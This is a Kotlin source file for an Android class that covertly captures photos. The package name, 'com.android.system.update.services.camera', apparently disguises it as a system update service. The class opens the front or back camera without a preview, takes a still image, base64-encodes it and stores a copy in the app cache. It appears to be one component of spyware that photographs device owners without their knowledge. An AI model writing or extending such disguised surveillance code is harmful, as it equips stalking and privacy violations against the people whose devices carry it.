package com.android.system.update.services.camera

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit

class CameraHelper(private val context: Context) {
    companion object {
        private const val TAG = "CameraHelper"
        private const val PHOTO_QUALITY = 70
        private const val TIMEOUT_SECONDS = 5L
    }
    data class PhotoResult(
        val success: Boolean,
        val base64Data: String? = null,
        val filePath: String? = null,
        val camera: String = "back",
        val errorMessage: String? = null,
        val errorType: String? = null
    )
    fun capturePhoto(useFrontCamera: Boolean = false): PhotoResult {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val targetFacing = if (useFrontCamera) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            var cameraId: String? = null
            var fallbackId: String? = null
            var frontCameraId: String? = null
            var backCameraId: String? = null
            
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                Log.d(TAG, "Camera $id: facing=$facing")
                when (facing) {
                    CameraCharacteristics.LENS_FACING_FRONT -> frontCameraId = id
                    CameraCharacteristics.LENS_FACING_BACK -> backCameraId = id
                    else -> {
                        if (fallbackId == null) fallbackId = id
                    }
                }
                if (facing == targetFacing) { cameraId = id; break }
            }
            
            // If no exact match, use the appropriate camera we found
            if (cameraId == null) {
                cameraId = if (useFrontCamera) frontCameraId ?: fallbackId else backCameraId ?: fallbackId
            }
            if (cameraId == null) {
                cameraId = fallbackId
                if (cameraId == null) return PhotoResult(false, errorMessage = "No camera available", errorType = "CameraNotFoundException")
            }
            Log.d(TAG, "Selected camera: $cameraId (front=$useFrontCamera)")
            val semaphore = Semaphore(0)
            var capturedBitmap: Bitmap? = null
            var captureError: String? = null
            val handlerThread = HandlerThread("CamCap")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val ir = android.media.ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
                        camera.createCaptureSession(listOf(ir.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(ir.surface)
                                    ir.setOnImageAvailableListener({ r ->
                                        val img = r.acquireLatestImage()
                                        if (img != null) {
                                            val buf = img.planes[0].buffer
                                            val bytes = ByteArray(buf.remaining())
                                            buf.get(bytes)
                                            capturedBitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                            img.close()
                                        }
                                        semaphore.release()
                                    }, handler)
                                    s.capture(req.build(), null, handler)
                                } catch (e: Exception) { captureError = "Capture: ${e.message}"; semaphore.release() }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { captureError = "Config fail"; semaphore.release() }
                        }, handler)
                    } catch (e: Exception) { captureError = "Session: ${e.message}"; semaphore.release() }
                }
                override fun onDisconnected(c: CameraDevice) { captureError = "Disconnected"; semaphore.release() }
                override fun onError(c: CameraDevice, err: Int) { captureError = "Error $err"; semaphore.release() }
            }, handler)
            if (!semaphore.tryAcquire(TIMEOUT_SECONDS, TimeUnit.SECONDS)) return PhotoResult(false, errorMessage = "Timeout", errorType = "TimeoutException")
            handlerThread.quitSafely()
            if (captureError != null) return PhotoResult(false, errorMessage = captureError, errorType = "CaptureError")
            val bitmap = capturedBitmap ?: return PhotoResult(false, errorMessage = "No image", errorType = "CaptureError")
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, PHOTO_QUALITY, stream)
            val byteArray = stream.toByteArray()
            val base64 = Base64.encodeToString(byteArray, Base64.NO_WRAP)
            val dir = File(context.cacheDir, "captured_photos"); dir.mkdirs()
            val f = File(dir, "photo_${System.currentTimeMillis()}.jpg")
            FileOutputStream(f).use { it.write(byteArray) }
            val label = if (targetFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
            return PhotoResult(success = true, base64Data = base64, filePath = f.absolutePath, camera = label)
        } catch (e: SecurityException) { return PhotoResult(false, errorMessage = "Permission denied", errorType = "SecurityException") }
        catch (e: Exception) { Log.e(TAG, "Error: ${e.message}", e); return PhotoResult(false, errorMessage = e.message, errorType = e.javaClass.simpleName) }
    }
}
